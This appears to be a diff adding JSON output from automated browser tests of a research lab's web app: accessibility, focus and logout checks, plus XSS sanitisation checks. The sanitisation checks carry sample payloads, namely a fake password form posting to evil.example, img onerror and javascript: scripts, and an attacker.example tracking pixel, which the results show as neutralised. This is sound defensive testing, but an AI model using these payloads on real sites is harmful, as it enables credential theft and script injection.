@@ -1,0 +1,428 @@
+{
+ "profile_edit": {
+  "log": {
+   "console": [],
+   "pageerror": [],
+   "dialogs": []
+  },
+  "inputs": [
+   [
+    "INPUT",
+    "profile_version",
+    "hidden",
+    ""
+   ],
+   [
+    "INPUT",
+    "name",
+    "text",
+    ""
+   ],
+   [
+    "INPUT",
+    "email",
+    "email",
+    ""
+   ],
+   [
+    "INPUT",
+    "institution",
+    "text",
+    ""
+   ],
+   [
+    "INPUT",
+    "department",
+    "text",
+    ""
+   ],
+   [
+    "TEXTAREA",
+    "research_summary",
+    "textarea",
+    ""
+   ],
+   [
+    "INPUT",
+    "techniques",
+    "hidden",
+    ""
+   ],
+   [
+    "INPUT",
+    "",
+    "text",
+    ""
+   ],
+   [
+    "INPUT",
+    "experimental_models",
+    "hidden",
+    ""
+   ],
+   [
+    "INPUT",
+    "",
+    "text",
+    ""
+   ],
+   [
+    "INPUT",
+    "disease_areas",
+    "hidden",
+    ""
+   ],
+   [
+    "INPUT",
+    "",
+    "text",
+    ""
+   ],
+   [
+    "INPUT",
+    "key_targets",
+    "hidden",
+    ""
+   ],
+   [
+    "INPUT",
+    "",
+    "text",
+    ""
+   ],
+   [
+    "INPUT",
+    "keywords",
+    "hidden",
+    ""
+   ],
+   [
+    "INPUT",
+    "",
+    "text",
+    ""
+   ]
+  ]
+ },
+ "kbd_activity": {
+  "tab_seq": [
+   "A #main-content",
+   "A /",
+   "A /profile",
+   "A /settings",
+   "A /agent",
+   "A /admin/users",
+   "BUTTON Sign out",
+   "A /admin/users",
+   "A /admin/jobs",
+   "A /admin/activity",
+   "A /admin/discussions",
+   "A /admin/agents",
+   "A /admin/assessments",
+   "A /admin/cohorts",
+   "A /admin/access-requests",
+   "A /admin/simulation",
+   "A /manager/prompt-suggestions",
+   "BODY Skip to main content\n\n\n\n\n\n\n\n  ",
+   "A #main-content",
+   "A /",
+   "A /profile",
+   "A /settings",
+   "A /agent",
+   "A /admin/users",
+   "BUTTON Sign out",
+   "A /admin/users",
+   "A /admin/jobs",
+   "A /admin/activity",
+   "A /admin/discussions",
+   "A /admin/agents",
+   "A /admin/assessments",
+   "A /admin/cohorts",
+   "A /admin/access-requests",
+   "A /admin/simulation",
+   "A /manager/prompt-suggestions",
+   "BODY Skip to main content\n\n\n\n\n\n\n\n  ",
+   "A #main-content",
+   "A /",
+   "A /profile",
+   "A /settings"
+  ],
+  "log": {
+   "console": [],
+   "pageerror": [],
+   "dialogs": []
+  }
+ },
+ "detail": {
+  "log": {
+   "console": [],
+   "pageerror": [],
+   "dialogs": []
+  },
+  "purify_default": "<form action=\"https://evil.example/x\"><input placeholder=\"password\" name=\"p\"><button>Sign in</button></form> <img src=\"https://evil.example/p.png\"> <div style=\"position:fixed;inset:0;background:red\" id=\"m-1\">overlay</div> <a>j</a> <a href=\"https://e.example\">t</a>",
+  "purify_version": "3.1.6",
+  "timeline_open_initially": false,
+  "clamp_state": [
+   {
+    "sh": 52,
+    "ch": 52,
+    "btn_hidden": true,
+    "any_visible_btn": []
+   },
+   {
+    "sh": 26,
+    "ch": 26,
+    "btn_hidden": true,
+    "any_visible_btn": []
+   },
+   {
+    "sh": 36,
+    "ch": 36,
+    "btn_hidden": false,
+    "any_visible_btn": []
+   },
+   {
+    "sh": 26,
+    "ch": 26,
+    "btn_hidden": true,
+    "any_visible_btn": []
+   },
+   {
+    "sh": 2848,
+    "ch": 256,
+    "btn_hidden": false,
+    "any_visible_btn": [
+     "Show full message"
+    ]
+   }
+  ]
+ },
+ "graph": {
+  "/cabo-graph": {
+   "axe": [
+    [
+     "landmark-one-main",
+     "moderate",
+     1,
+     "html"
+    ],
+    [
+     "page-has-heading-one",
+     "moderate",
+     1,
+     "html"
+    ],
+    [
+     "region",
+     "moderate",
+     5,
+     ".header"
+    ]
+   ],
+   "log": {
+    "console": [],
+    "pageerror": [],
+    "dialogs": []
+   },
+   "overflow375": null,
+   "log375": {
+    "console": [],
+    "pageerror": [],
+    "dialogs": []
+   }
+  },
+  "/scripps-graph": {
+   "axe": [
+    [
+     "landmark-one-main",
+     "moderate",
+     1,
+     "html"
+    ],
+    [
+     "page-has-heading-one",
+     "moderate",
+     1,
+     "html"
+    ],
+    [
+     "region",
+     "moderate",
+     4,
+     ".header"
+    ]
+   ],
+   "log": {
+    "console": [],
+    "pageerror": [],
+    "dialogs": []
+   },
+   "overflow375": null,
+   "log375": {
+    "console": [],
+    "pageerror": [],
+    "dialogs": []
+   }
+  }
+ },
+ "chat_focus": {
+  "during": "BODY#",
+  "after": "BODY#",
+  "log": {
+   "console": [
+    "error: Failed to load resource: the server responded with a status of 409 (Conflict)"
+   ],
+   "pageerror": [],
+   "dialogs": []
+  }
+ },
+ "admin_desktop": {
+  "log": {
+   "console": [],
+   "pageerror": [],
+   "dialogs": []
+  },
+  "open_button": 1,
+  "drawer_visible": true,
+  "focus_after_open": "assessment-chat-question",
+  "xss": 0,
+  "log_html": "ace-pre-wrap rounded-lg bg-indigo-50 px-3 py-2 text-sm text-gray-900\">What is proposed? &lt;img src=x onerror=window.__xss=1&gt;</p><div class=\"rounded-lg border border-gray-200 px-3 py-2\"><div class=\"md-content text-sm leading-relaxed text-gray-800\"><p><strong>Answer.</strong> <code>&lt;img src=x onerror=\"window.__xss=1\"&gt;</code> js (<code>javascript:window.__xss=1</code>) pixel (<code>https://attacker.example/p.png</code>) xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx The record cites <a href=\"https://doi.org/10.1000/chat-fixture\" rel=\"noopener noreferrer nofollow\" target=\"_blank\">https://doi.org/10.1000/chat-fixture</a><span class=\"text-gray-600\"> (doi.org)</span>.\u2009<sup><a class=\"text-indigo-700\" href=\"#chat-src-8a044545-ae52-4ff0-a9de-e5ac98f301b5-1\">[1]</a></sup></p>\n</div><div class=\"mt-2 border-t border-gray-100 pt-2\"><button class=\"flex items-center gap-1 text-sm font-semibold uppercase tracking-wide text-gray-600 hover:text-gray-900\" type=\"button\" id=\"chat-sources-toggle-8a044545-ae52-4ff0-a9de-e5ac98f301b5\" aria-controls=\"chat-sources-8a044545-ae52-4ff0-a9de-e5ac98f301b5\" aria-expanded=\"false\"><span aria-hidden=\"true\">\u25b8</span>Sources (1)</button><ol class=\"mt-1 space-y-2 text-sm\" id=\"chat-sources-8a044545-ae52-4ff0-a9de-e5ac98f301b5\" hidden=\"\"><li class=\"flex items-start justify-between gap-2 rounded border border-gray-200 p-2\" id=\"chat-src-8a044545-ae52-4ff0-a9de-e5ac98f301b5-1\"><span class=\"font-medium text-gray-800\">[1] Message 1 of 4 \u00b7 ObrienBot (the lab's agent) \u00b7 new_post</span><button class=\"shrink-0 text-indigo-700 hover:underline\" type=\"button\">Show in page</button></li></ol></div></div></section>",
+  "links": [
+   [
+    "https://doi.org/10.1000/chat-fixture",
+    "_blank",
+    "noopener noreferrer nofollow"
+   ],
+   [
+    "#chat-src-8a044545-ae52-4ff0-a9de-e5ac98f301b5-1",
+    "",
+    ""
+   ]
+  ],
+  "imgs": 0,
+  "error_text": "",
+  "overflow": 4008,
+  "log_overflow": 1239,
+  "visible_after_esc": false,
+  "focus_after_esc": "opener",
+  "reopen_turns": 1,
+  "after_logout_error": "Your session has ended \u2014 reload the page.",
+  "after_logout_url": "http://localhost:8790/admin/assessments/12e04c8f-3bfd-4aa8-8cea-8027d5887819"
+ },
+ "admin_mobile": {
+  "log": {
+   "console": [
+    "error: Failed to load resource: the server responded with a status of 409 (Conflict)"
+   ],
+   "pageerror": [],
+   "dialogs": []
+  },
+  "open_button": 1,
+  "drawer_visible": true,
+  "focus_after_open": "assessment-chat-question",
+  "xss": 0,
+  "log_html": "",
+  "links": [],
+  "imgs": 0,
+  "error_text": "An answer is still being written. Wait for it to finish.",
+  "overflow": 0,
+  "log_overflow": 0,
+  "visible_after_esc": false,
+  "focus_after_esc": "opener",
+  "reopen_turns": 0,
+  "after_logout_error": "Your session has ended \u2014 reload the page.",
+  "after_logout_url": "http://localhost:8790/admin/assessments/b5550d98-b7bb-41b3-adeb-0f0e5dcc01b9"
+ },
+ "manager": {
+  "log": {
+   "console": [],
+   "pageerror": [],
+   "dialogs": []
+  },
+  "open_button": 1,
+  "drawer_visible": true,
+  "focus_after_open": "assessment-chat-question",
+  "xss": 0,
+  "log_html": "pre-wrap rounded-lg bg-indigo-50 px-3 py-2 text-sm text-gray-900\">What is proposed? &lt;img src=x onerror=window.__xss=1&gt;</p><div class=\"rounded-lg border border-gray-200 px-3 py-2\"><div class=\"md-content text-sm leading-relaxed text-gray-800\"><p><strong>Answer.</strong> <code>&lt;img src=x onerror=\"window.__xss=1\"&gt;</code> js (<code>javascript:window.__xss=1</code>) pixel (<code>https://attacker.example/p.png</code>) xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx The record cites <a href=\"https://doi.org/10.1000/chat-fixture\" rel=\"noopener noreferrer nofollow\" target=\"_blank\">https://doi.org/10.1000/chat-fixture</a><span class=\"text-gray-600\"> (doi.org)</span>.\u2009<sup><a class=\"text-indigo-700\" href=\"#chat-src-03d27af5-12b1-43bf-9b81-db59752b75cb-1\">[1]</a></sup></p>\n</div><div class=\"mt-2 border-t border-gray-100 pt-2\"><button class=\"flex items-center gap-1 text-sm font-semibold uppercase tracking-wide text-gray-600 hover:text-gray-900\" type=\"button\" id=\"chat-sources-toggle-03d27af5-12b1-43bf-9b81-db59752b75cb\" aria-controls=\"chat-sources-03d27af5-12b1-43bf-9b81-db59752b75cb\" aria-expanded=\"false\"><span aria-hidden=\"true\">\u25b8</span>Sources (1)</button><ol class=\"mt-1 space-y-2 text-sm\" id=\"chat-sources-03d27af5-12b1-43bf-9b81-db59752b75cb\" hidden=\"\"><li class=\"flex items-start justify-between gap-2 rounded border border-gray-200 p-2\" id=\"chat-src-03d27af5-12b1-43bf-9b81-db59752b75cb-1\"><span class=\"font-medium text-gray-800\">[1] Message 1 of 3 \u00b7 VogelsteinBot (the lab's agent) \u00b7 new_post</span><button class=\"shrink-0 text-indigo-700 hover:underline\" type=\"button\">Show in page</button></li></ol></div></div></section>",
+  "links": [
+   [
+    "https://doi.org/10.1000/chat-fixture",
+    "_blank",
+    "noopener noreferrer nofollow"
+   ],
+   [
+    "#chat-src-03d27af5-12b1-43bf-9b81-db59752b75cb-1",
+    "",
+    ""
+   ]
+  ],
+  "imgs": 0,
+  "error_text": "",
+  "overflow": 0,
+  "log_overflow": 1239,
+  "visible_after_esc": false,
+  "focus_after_esc": "opener",
+  "reopen_turns": 1,
+  "after_logout_error": "Your session has ended \u2014 reload the page.",
+  "after_logout_url": "http://localhost:8790/manager/assessments/b5550d98-b7bb-41b3-adeb-0f0e5dcc01b9"
+ },
+ "reviewer": {
+  "log": {
+   "console": [],
+   "pageerror": [],
+   "dialogs": []
+  },
+  "open_button": 1,
+  "drawer_visible": true,
+  "focus_after_open": "assessment-chat-question",
+  "xss": 0,
+  "log_html": "ace-pre-wrap rounded-lg bg-indigo-50 px-3 py-2 text-sm text-gray-900\">What is proposed? &lt;img src=x onerror=window.__xss=1&gt;</p><div class=\"rounded-lg border border-gray-200 px-3 py-2\"><div class=\"md-content text-sm leading-relaxed text-gray-800\"><p><strong>Answer.</strong> <code>&lt;img src=x onerror=\"window.__xss=1\"&gt;</code> js (<code>javascript:window.__xss=1</code>) pixel (<code>https://attacker.example/p.png</code>) xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx The record cites <a href=\"https://doi.org/10.1000/chat-fixture\" rel=\"noopener noreferrer nofollow\" target=\"_blank\">https://doi.org/10.1000/chat-fixture</a><span class=\"text-gray-600\"> (doi.org)</span>.\u2009<sup><a class=\"text-indigo-700\" href=\"#chat-src-1cbfe9cc-8a4d-4da7-9ab3-21aa290dd7e9-1\">[1]</a></sup></p>\n</div><div class=\"mt-2 border-t border-gray-100 pt-2\"><button class=\"flex items-center gap-1 text-sm font-semibold uppercase tracking-wide text-gray-600 hover:text-gray-900\" type=\"button\" id=\"chat-sources-toggle-1cbfe9cc-8a4d-4da7-9ab3-21aa290dd7e9\" aria-controls=\"chat-sources-1cbfe9cc-8a4d-4da7-9ab3-21aa290dd7e9\" aria-expanded=\"false\"><span aria-hidden=\"true\">\u25b8</span>Sources (1)</button><ol class=\"mt-1 space-y-2 text-sm\" id=\"chat-sources-1cbfe9cc-8a4d-4da7-9ab3-21aa290dd7e9\" hidden=\"\"><li class=\"flex items-start justify-between gap-2 rounded border border-gray-200 p-2\" id=\"chat-src-1cbfe9cc-8a4d-4da7-9ab3-21aa290dd7e9-1\"><span class=\"font-medium text-gray-800\">[1] Message 1 of 4 \u00b7 ObrienBot (the lab's agent) \u00b7 new_post</span><button class=\"shrink-0 text-indigo-700 hover:underline\" type=\"button\">Show in page</button></li></ol></div></div></section>",
+  "links": [
+   [
+    "https://doi.org/10.1000/chat-fixture",
+    "_blank",
+    "noopener noreferrer nofollow"
+   ],
+   [
+    "#chat-src-1cbfe9cc-8a4d-4da7-9ab3-21aa290dd7e9-1",
+    "",
+    ""
+   ]
+  ],
+  "imgs": 0,
+  "error_text": "",
+  "overflow": 4008,
+  "log_overflow": 1239,
+  "visible_after_esc": false,
+  "focus_after_esc": "opener",
+  "reopen_turns": 1,
+  "after_logout_error": "Your session has ended \u2014 reload the page.",
+  "after_logout_url": "http://localhost:8790/manager/assessments/12e04c8f-3bfd-4aa8-8cea-8027d5887819"
+ },
+ "sim_expiry": {
+  "has_sim_body": 1,
+  "nav_count": 2,
+  "login_form_injected": 0,
+  "log": {
+   "console": [],
+   "pageerror": [],
+   "dialogs": []
+  }
+ },
+ "sim_refresh": {
+  "log": {
+   "console": [],
+   "pageerror": [],
+   "dialogs": []
+  },
+  "has_form": 1,
+  "before": [
+   "60",
+   "20"
+  ],
+  "after": [
+   "0",
+   "0"
+  ]
+ }
+}
